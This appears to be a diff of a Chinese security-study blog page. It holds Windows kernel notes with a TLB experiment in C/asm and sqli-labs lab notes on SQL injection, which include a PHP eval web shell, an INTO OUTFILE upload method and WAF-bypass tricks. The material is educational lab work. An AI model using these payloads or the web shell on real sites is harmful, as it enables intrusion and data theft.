+<p>4 -&gt; 直写，写到缓存后，同时同步到主存（从L1，L2，L3一路同步过去）；</p>
+<p>7 -&gt; 弱无缓存；</p>
+<p>5 -&gt; 写保护，只读，不可写；</p>
+<p>利用写合并的特性，可以一定程度上提升CPU效率（比如一个特别大的循环里只一次性赋值4个值，可以多循环几次，这样比循环一次赋多值更快！）(疑似无效了？)；</p>
+<p>写保护和 R/W 位实际上是一个东西；</p>
+<p>对于只读的页属性有一个有意思的地方，这里先给出前置知识：</p>
+<ol>
+<li><p>虚拟地址管理（VAD）会给出当前虚拟地址所拥有的属性（保护模式下的段概念）；</p>
+<p>这个属性里也有RWE，同时有一个写时拷贝的属性；</p>
+</li>
+<li><p>同一路径同一名称的dll被不同exe加载，使用的物理页一样，虚拟地址不一样而已；</p>
+</li>
+<li><p>使用VirtualProtect改的属性实际上是VAD指向的属性，页属性不做变化；</p>
+</li>
+</ol>
+<p>当VAD的属性是可写的时候，而指向的物理页的R/W或者写保护位是不可写的时候，操作系统触发页异常，此时会查看VAD里面的写时拷贝属性，如果为1（写时可拷贝），那么就进行异常处理：将物理页分成两份，并给写到的物理页属性变为可写，此时两份dll内存才分开；</p>
+<p>写时拷贝的意义在于只有改变时才进行隔离，因为不改变时，两份相同的没有意义，只用一份即可，所以直观看起来，每个进程的模块也是独立的，实则不然；</p>
+<p>PAT: 页属性表，当此位为1时，该页用于管理缓存的属性；</p>
+<p>PCD: 页缓存关闭，当此位为1时，不用缓存；</p>
+<p>PWT: 页直写，为1就是直写模式（适用于多媒体实时更新）；</p>
+<h2 id="TLB"><a href="#TLB" class="headerlink" title="TLB"></a>TLB</h2><p>一般分两种类型 ITLB,DTLB；</p>
+<p>I是指令，D是数据，它们的TLB不是同一个，是分开的；</p>
+<p>这两类又细分小页(4KB)TLB和大页(2MB，4MB)TLB；</p>
+<p>大页的概念：由PDE直接寻址，即二级页表指向的直接就是一个大的页面，PDE.ps属性为1；</p>
+<p>32位下，TLB内部存放的格式大概如图：</p>
+<table>
+<thead>
+<tr>
+<th>虚拟页帧</th>
+<th>物理页帧</th>
+<th>属性</th>
+<th>次数</th>
+</tr>
+</thead>
+</table>
+<p>页帧的概念就是不加页内偏移的其余部分；</p>
+<p>我们之前说过，TLB快表的存在的意义就是加速物理地址访问，省去映射过程，省去内存中的页表结构访问过程；</p>
+<p>如何证明它是存在的呢？正常而言，它的过程和效果就和映射，查看页表一样，对于我们人来说是不可见的；</p>
+<p>但接下来这个实验可以证明TLB真实存在；</p>
+<p>我们分配两个地址空间，分别是a和b的内容，然后我们分别把这两个地址挂到虚拟0地址；</p>
+<p>接下来分别访问两次0地址，如果两次访问结果内容相同，就说明是有TLB存在的；</p>
+<p>因为访问过一次以后，它会把对应TLB关系写入TLB内，第二次访问它直接拿0地址去TLB寻址返回对应的物理页帧，而不再重新映射一遍；</p>
+<p>我们这两次访问要足够快，不然TLB就把记录给刷掉了；</p>
+<p>所以选择使用中断门进行手动修改和访问，代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE*A,*B;</span><br><span class="line"><span class="keyword">int</span> a,b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) test()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		push <span class="number">0x30</span></span><br><span class="line">		pop fs</span><br><span class="line"></span><br><span class="line">		mov eax, [A]   </span><br><span class="line">	    shr eax,<span class="number">9</span></span><br><span class="line">		<span class="keyword">and</span> eax, <span class="number">0x7ffff8</span></span><br><span class="line">		add eax, <span class="number">0xc0000000</span>   <span class="comment">//获取A的PTE</span></span><br><span class="line"></span><br><span class="line">		mov ecx,[eax]		</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],ecx	<span class="comment">//挂到0地址,不用管高位</span></span><br><span class="line"></span><br><span class="line">		mov eax, dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov [a],eax</span><br><span class="line"></span><br><span class="line">		mov eax, [B]   </span><br><span class="line">	    shr eax,<span class="number">9</span></span><br><span class="line">		<span class="keyword">and</span> eax, <span class="number">0x7ffff8</span></span><br><span class="line">		add eax, <span class="number">0xc0000000</span>   <span class="comment">//获取B的PTE</span></span><br><span class="line"></span><br><span class="line">		mov ecx,[eax]		</span><br><span class="line">		mov dword ptr ds:[<span class="number">0xc0000000</span>],ecx	<span class="comment">//挂到0地址,不用管高位</span></span><br><span class="line"></span><br><span class="line">		mov eax, dword ptr ds:[<span class="number">0</span>]</span><br><span class="line">		mov [b],eax</span><br><span class="line"></span><br><span class="line">		push <span class="number">0x3b</span></span><br><span class="line">		pop fs</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> bufcode[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	A = (BYTE*)VirtualAlloc(<span class="number">0</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	B = (BYTE*)VirtualAlloc(<span class="number">0</span>,<span class="number">0x1000</span>,MEM_COMMIT,PAGE_READWRITE);</span><br><span class="line">	*A = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">	*B = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;A地址: %p\n&quot;</span>,A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;B地址: %p\n&quot;</span>,B);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;A: %c\n&quot;</span>,*A);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;B: %c\n&quot;</span>,*B);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr bufcode</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a: %c\n&quot;</span>,a);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;b: %c\n&quot;</span>,b);</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实验结果如下：</p>
+<p><img src="https://s2.loli.net/2024/12/16/n9y1NtXJVBPfkDU.png" alt="TLB结果"></p>
+<p>这说明TLB确实存在，不信可以仔细看看代码；</p>
+<p>在指令中，有一个指令 [invlpg 地址]，指定刷掉TLB中的对应虚拟地址；</p>
+<h2 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h2><p>32位如图（64位也有它们）：</p>
+<p><img src="https://s2.loli.net/2024/12/16/xznXEr69TVKksgI.png" alt="CR"></p>
+<p>CR1是保留寄存器没有使用；</p>
+<p>CR2存放的是页异常虚拟地址，用于告知14号中断是哪个线性地址出了异常，中断调用没有形参；</p>
+<p>CR3存放页表基址，以及标记该进程的缓存属性；</p>
+<p>CR0：</p>
+<p>PG是页模式开启，PE是段模式开启，在保护模式下默认都是1；</p>
+<p>EM,MP,NE,ET是和数学，浮点数，错误相关，不太重要；</p>
+<p>TS是任务段，在任务段内TS置为1；</p>
+<p>CD置一，那么全部没有缓存，是缓存总开关，NW置一，所有都不直写；</p>
+<p>WP，保护写，写权限的总开关，置为0强行写任意页；</p>
+<p>AM，r3环境下的对齐，64位下，为1那么CR4里面的SMAP,SMEP生效；</p>
+<p>CR4：</p>
+<p>VME，开启虚拟8086模式；</p>
+<p>PVI，开启虚拟8086模式下的模拟中断；</p>
+<p>TSD，如果为1，r3可以调用rdtsc指令，否则报错;</p>
+<p>DE，如果为1，DR4=DR6 DR5=DR7，否则访问DR5,DR4异常（调试寄存器）；</p>
+<p>PSE，如果为1，大页有效，大页总开关；</p>
+<p>PAE，如果为1，那么29912，否则101012；</p>
+<p>MCE，机器检查中断（0x12中断）有效位；</p>
+<p>PGE，如果为1，页的G位有效，否则无效；</p>
+<p>PCE，监控事件开关；</p>
+<p>VMXE，如果为1，开启VT；</p>
+<p>SMXE，如果为1，开启上帝模式；</p>
+<p>OSFXSR,OSXMMEXCPT,UMIP,LA57,OSXSAVE与浮点相关；</p>
+<p>FSGSBASE，FS可以不通过段解析拆分，rdmsr指令直接获取fs基址；</p>
+<p>PCIDE，每个进程的CR3是否有缓存；</p>
+<p>SMEP，SMAP -&gt; super mode (execute/access)，如果为1，r0不可以执行和访问r3；</p>
+<p>CET, 无用；</p>
+<p>PKS，PKE，是否加密页表；</p>
+</div></div><a class="button-hover more" href="/SecondBC/2024/12/16/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E5%BC%95%E5%85%A5-Windows%E9%A9%B1%E5%8A%A8%E7%BC%96%E7%A8%8B%E4%B8%80/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2024/10/30/%E6%A0%88%E6%BA%A2%E5%87%BA%E8%BF%9B%E9%98%B6/">栈溢出进阶</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2024-10-30</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Pwn/">Pwn</a></div></div><div class="post-content"><div class="main-content content"><p>所用题目可在<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/">中级ROP - CTF Wiki (ctf-wiki.org)</a>找到；</p>
 <h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>对于X64(amd64)程序，函数传参为rdi,rsi,rdx,rcx,r8,r9，然后是栈；</p>
 <p>而x64程序中有这样一个系统自带函数 __libc_csu_init，这个函数是用来对 libc 进行初始化操作的；</p>
 <p>这个函数里面有许多可以利用的gadget，可以控制一些寄存器，可以用一道题来进行演示（level5）；</p>
@@ -1065,223 +1573,4 @@ if (isPassword) {
 <p>但基础篇尚未提及一点，在dump之后的文件虽然是可以查看其源码的，但如果需要动调，是无法实现的；</p>
 <p>此时要让dump的程序能运行，则需要修复其导入表，因为此时导入表dump出的是实打实的地址，需要利用地址反找函数符号，重新构建导入表结构；</p>
 <p>修复导入表一般用脚本完成，脚本实现思路如上述所示；</p>
-</div></div><a class="button-hover more" href="/SecondBC/2024/02/26/%E5%A3%B3%E8%BF%9B%E9%98%B6/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2024/02/26/SQL%E6%B3%A8%E5%85%A5-sqlilabs/">SQL注入-sqlilabs</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2024-05-20</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Lab/">Lab</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Web/">Web</a></div></div><div class="post-content"><div class="main-content content"><p>本篇根据sqli-labs展开而来笔记，基于mysql，php的环境；</p>
-<p>前置知识：SQL语法，在SQL学习日记中有讲述；</p>
-<h2 id="less01-less04"><a href="#less01-less04" class="headerlink" title="less01~less04"></a>less01~less04</h2><h3 id="解题一般步骤-思路"><a href="#解题一般步骤-思路" class="headerlink" title="解题一般步骤/思路"></a>解题一般步骤/思路</h3><ol>
-<li>判断是否可注入（单引号/双引号/括号报错）</li>
-<li>判断字段数，使用order by n；<ul>
-<li>order by n 的含义是按照第n个字段排序；</li>
-</ul>
-</li>
-<li>确定回显字段，使用 union select 1,2,…,n;<ul>
-<li>联合查找将前面的select联系起来，select 常数 的含义是给查询结果一个临时的列，这个列所有行都是这个常数，一共有表内对象个的行数；</li>
-<li>在使用时，往往回显只显示第一行（联合查找前半段），需要将第一行的内容屏蔽掉，如limit，或者使第一行等于一个非法值；</li>
-</ul>
-</li>
-<li>利用回显的字段查询出数据库，表，字段，以及需要的所有数据；</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata  		#找库</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#x27;</span>		#从库找表</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#x27;</span>		#从表找字段</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> xxx.xxx					#找数据</span><br></pre></td></tr></table></figure>
-
-<p>在找数据时，经常用到以下两个函数：</p>
-<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><ul>
-<li>使此函数括号内的查询结果拼成一行，如图；</li>
-</ul>
-<p><img src="https://s2.loli.net/2023/10/16/LdE7GvQUlF1cApX.png" alt="group_concat()"></p>
-<h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><ul>
-<li>此函数有三个参数，第一个为拼接符，后两个为拼接字段，输出为两个字段的拼接态，如图;</li>
-</ul>
-<p><img src="https://s2.loli.net/2023/10/16/8ibBxTZWR9gsXIU.png" alt="concat_ws"></p>
-<p>为什么需要使用这两个函数？正如前面所述，回显一般只显示查询的第一行，需要将查到的账号密码拼接而且合并为一行输出，这样才能在回显上观察到需要的全貌；</p>
-<h2 id="less05-less06"><a href="#less05-less06" class="headerlink" title="less05~less06"></a>less05~less06</h2><p>此类型为：</p>
-<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>回显只会显示查询结果正确或是错误，不会回显出查询的内容；</p>
-<p>使用以下函数以进行对字符串的操作：</p>
-<h4 id="left"><a href="#left" class="headerlink" title="left()"></a>left()</h4><p>其中有两个参数，第一个为字符串，第二个为长度，作用为从左截取长度个字符串内的字符；</p>
-<p>例如以下内容：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">left</span>(database(),<span class="number">4</span>);				#截取当前数据库名的前<span class="number">4</span>个字符</span><br></pre></td></tr></table></figure>
-
-<p>由此可以对截取内容进行比较：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;s&#x27;</span>;			#正确返回<span class="number">1</span>，错误返回<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<p>由此来使得获取库名的目的；</p>
-<h4 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h4><p>三个参数，第一个为字符串，第二个为起始位置，第三个为截取长度，例如substr(a,b,c)，作用为截取a字符串，从b位置开始，截取c位长度；</p>
-<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii()"></a>ascii()</h4><p>将输入的字符转为其ascii值；</p>
-<p>使用以上函数便可完成对字符的判断，从而得到库名，一般不会直接使用等于多少多少字符，而是每个字符转为ascii后采用二分法判断其是哪个字符；</p>
-<p>当然也可用BP抓包，暴力破解，具体步骤为抓包-&gt;转发测试器(Intruder)-&gt;添加变量位置-&gt;选择暴力破解-&gt;规定字符集以及长度-&gt;选择进程数-&gt;开始；</p>
-<p>测出的发包观察其长度变化，找到独异个体，查看其响应包内是否为正确回显即可；</p>
-<p>之后便根据此方法依次判断库名，表名，字段名，以及账号密码；</p>
-<h2 id="less07"><a href="#less07" class="headerlink" title="less07"></a>less07</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>由于才疏识浅，能找到的内容如下，会有不严谨和错误的地方：</p>
-<p>php版本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>上传到目的网址后，使用中国菜刀打开其路径并加上pass变量，即可查看其所有数据；</p>
-<p>其含义为 <code>&lt;?php ?&gt;</code> 是html将此包裹里的内容作为php语句执行；</p>
-<p>艾特符号取消报错，eval函数将输入的字符串作为命令执行；</p>
-<p>$_POST变量是全局的php变量，也是一个数组，括号内的pass则是其下标，对应pass变量，译作将post发送的内容转给pass变量；</p>
-<p>整句话的意思是：将post的内容作为指令在服务器上执行；</p>
-<p>中国菜刀的原理简单理解为窗口化的post输入指令，每点一下都是在对服务器post指令；</p>
-<h3 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h3><p>写文件关键字，用法：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> a,b,c <span class="keyword">into</span> outfile <span class="string">&#x27;path\\1.txt&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h3><p>读文件，直接跟在select后面作为查询内容，参数为文件路径；</p>
-<p>解法也如同之前所述，先判断注入点，之后用 into outfile 将一句话木马作为字符串写入目标文件内，之后便可用中国菜刀访问web shell；</p>
-<h2 id="less08-less10"><a href="#less08-less10" class="headerlink" title="less08~less10"></a>less08~less10</h2><h3 id="if"><a href="#if" class="headerlink" title="if()"></a>if()</h3><p>类似三目运算，三个参数，第一个为条件，第二个为真时返回值，第三个为假时返回值；</p>
-<p>if函数一般与sleep函数一起使用，sleep函数的参数单位为秒，构成时间盲注的句子；</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>当回显内容为空时，此时可以采用时间盲注的方法；</p>
-<p>回显为空时如何判断注入漏洞？在可能出现漏洞的地方加入sleep函数来测试，是否响应时间变动；</p>
-<p>布尔盲注是根据回显判断内容是否正确，那么时间盲注即是根据响应时间来判断是否正确，如下面一段话：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if(length(database())<span class="operator">=</span><span class="number">7</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>
-
-<p>当前数据库名长度为7时返回1，否则睡眠5秒，在where中加入此条件的话，会导致判断时网页的响应时间发生变化，由此进行判断；</p>
-<p>由此方法与布尔盲注类似，不断去判断库名，表名，字段名，拿到数据；</p>
-<p>也可以用sqlmap脚本自动爆破，以及bp；</p>
-<p>此方法的开销较大，一般不选用；</p>
-<h2 id="less11-less16"><a href="#less11-less16" class="headerlink" title="less11~less16"></a>less11~less16</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><p>比起get注入，需要注意的点为参数名称需要用bp抓包来获取，之后使用hackbar的post方法发包，且注释符需要使用 # ，–+ 一般用于url中；</p>
-<p>获取到注入点也同之前一样，之后，可使用 or 1=1 来永真返回；</p>
-<p>查找表和数据的步骤如之前一样进行；</p>
-<p>盲注步骤也一样；</p>
-<h2 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>核心函数：</p>
-<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>三个参数，第一个为XML文档对象的名称，第二个为Xpath格式的字符串，第三个为替换数据；</p>
-<p>作用为改变文档中符合条件的节点；</p>
-<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>两个参数，用法同上函数，第一个参数为对象名，第二个为Xpath格式的字符串；</p>
-<p>而在报错注入中，concat函数返回的类型时一个字符串，不符合xpath的格式，所以会报错，并给出这个字符串的内容，从而获取信息；</p>
-<p>如下：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
-
-<p>会导致其报错而显示database的内容：</p>
-<p><img src="https://s2.loli.net/2023/10/19/ldjkMuKAaqteV3x.png" alt="xpath error"></p>
-<p>这个方法有什么用？ </p>
-<p>高效：对于无回显可以这么用，直接拿名称；</p>
-<p>防止过滤关键词，比如不让用union select了怎么查呢？</p>
-<h2 id="less18-less22"><a href="#less18-less22" class="headerlink" title="less18~less22"></a>less18~less22</h2><h3 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h3><p>当发包信息参与了sql语句时，可以利用http头进行注入（如回显有这些内容时，可以猜测）；</p>
-<p>一般是将useragent，或者ip，或者等等的头信息作为参数加入sql语言中；</p>
-<p>思路是使用bp重构这些参数，使其在sql语句中时产生注入漏洞；</p>
-<p>注意：不要打乱这些参数序列！！！（<strong>构造闭合</strong>）</p>
-<p>cookie注入如法炮制，cookie的发包一般在原包的后面一个包，里面包含了cookie字段；</p>
-<p>对于base64编码的内容，也需要将构造的payload进行base64编码然后发包;</p>
-<p>例如：</p>
-<p>18关登录成功的情况下是会回显useragent的：</p>
-<p><img src="https://s2.loli.net/2023/10/19/KpeqE9VPILt5oxb.png" alt="feedback"></p>
-<p>利用bp的重发器，在useragent的地方使用单引号判断出有注入漏洞，则可在这个位置进行payload构造：</p>
-<p><img src="https://s2.loli.net/2023/10/19/lOyI3ozBK4kQsAZ.png" alt="repeat"></p>
-<p>注意根据语法错误构造闭合：</p>
-<p>原内容为注入点后面还有两个字符串，并且有个括号，那么构造payload应该为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; payload,&#x27;&#x27;,&#x27;&#x27;) #</span></span><br><span class="line"><span class="string">或者</span></span><br><span class="line"><span class="string">&#x27;</span> payload <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>之后如法炮制拿数据；</p>
-<p>至此，基础篇结束；</p>
-<h2 id="less23"><a href="#less23" class="headerlink" title="less23"></a>less23</h2><p>当 –+ 或者 # 被注释掉时，可以试用如下内容：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="operator">%</span><span class="number">00</span></span><br></pre></td></tr></table></figure>
-
-<p>我的理解是单引号分割语句，%00为url编码中的空字符对后面的内容进行截断，导致sql语言能正常执行；</p>
-<p>也可以构造常规语句来闭合引号；</p>
-<h3 id="SQL语句执行顺序"><a href="#SQL语句执行顺序" class="headerlink" title="SQL语句执行顺序"></a>SQL语句执行顺序</h3><p>在where附加条件时，如果order by 后面还有跟 and or 一类的连接符，order by 会被忽略掉；</p>
-<h2 id="less24"><a href="#less24" class="headerlink" title="less24"></a>less24</h2><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>注入时，特殊字符被转义无法导致注入，只有将转义后的内容存入数据库，之后引用这个数据时发生注入漏洞，称二次注入；</p>
-<p>例子：在注册用户时，给已有用户名后面加 ‘# 符号，致使 user’#被创建，在修改密码时，引用字符应为：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;sss&#x27;</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>此时发生注入漏洞，并将原本的user账户的密码修改了；</p>
-<h2 id="less25-less25a"><a href="#less25-less25a" class="headerlink" title="less25~less25a"></a>less25~less25a</h2><h3 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h3><p>可分为三类：</p>
-<ul>
-<li><p>白盒绕过</p>
-<ul>
-<li>通过获取源码分析的方式进行绕过；</li>
-</ul>
-</li>
-<li><p>黑盒绕过</p>
-<ul>
-<li><p>架构层面</p>
-<p>​    寻找原网站绕过：针对云WAF，云waf的作用类似于拦截网，先通过其进行验证，之后将数据交给原网址，类似CDN；</p>
-<p>​    对于CDN：通过超级ping，在不同地区的CDN返回ping值不同的结果；</p>
-<p>​            注册，直接转到原网站；</p>
-<p>​            通过国外IP地址访问，对于个别网站CDN只针对于国内；</p>
-<p>​    通过同网段绕过：一个网段中，经过的数据可能不会经过云WAF，可以先拿到网段中其他主机的权限，对目标交互；</p>
-<p>​    对于网段解释：192.168.1.0 ~ 192.168.1.255称为一段 （局域网概念）</p>
-</li>
-<li><p>资源限制角度</p>
-<p>​    一般WAF执行需要优先考虑业务优先原则，对于构造超大的数据包可能不会进行检测，实现绕过；</p>
-</li>
-<li><p>协议层面</p>
-<p>​    get型比post型要小，由于业务需求，只对get检测，可通过在post内构造图片后面跟注入语句的方式进行测试；</p>
-<p>​    参数污染：<code>index?id=1&amp;id=2</code> 可能只对id=1进行检测;</p>
-</li>
-<li><p>规则层面</p>
-<p>​    sql注释符绕过：当不允许使用空格，用/**/来代替空格，或者在注释内添加超长内容；</p>
-<p>​                 使用内联注释（mysql特有） <code>/*!union select */</code> 注释内的代码可执行；</p>
-<p>​                 也可以用括号将关键字分割开；</p>
-<p>​    空白符绕过：   对于空格的填充，url编码；</p>
-<p>​                 mysql空白符：%09; %0A; %0B; %0D; %20; %0C; %A0;</p>
-<p>​                 正则空白符：%09; %0A; %0B; %0D; %20;</p>
-<p>​                 %25编码为%，%25A0则是空白符；</p>
-<p>​    函数分隔符号:  将一个函数进行分割，在函数名称后面跟空白符；</p>
-<p>​    浮点数词法解释：WAF对id=1可以检测，但对于id=1.0、id=\N、id=1E0可能无法检测；</p>
-<p>​    利用error-based进行sql注入；</p>
-<p>​    mysql特殊语法：例如 select {x name} from {x table}；</p>
-<p>​    大小写绕过：   如果对 and or union 关键字过滤，可以采用大小写混用的方法，也可使用双写；</p>
-<p>​                 在过滤大小写混用时，采用OORr的写法，会被过滤为or（中间or消失），则是双写，也可以尝试关键词替换；</p>
-</li>
-</ul>
-</li>
-<li><p>fuzz测试</p>
-<ul>
-<li>使用bp测试，测试成功用脚本处理；</li>
-</ul>
-</li>
-</ul>
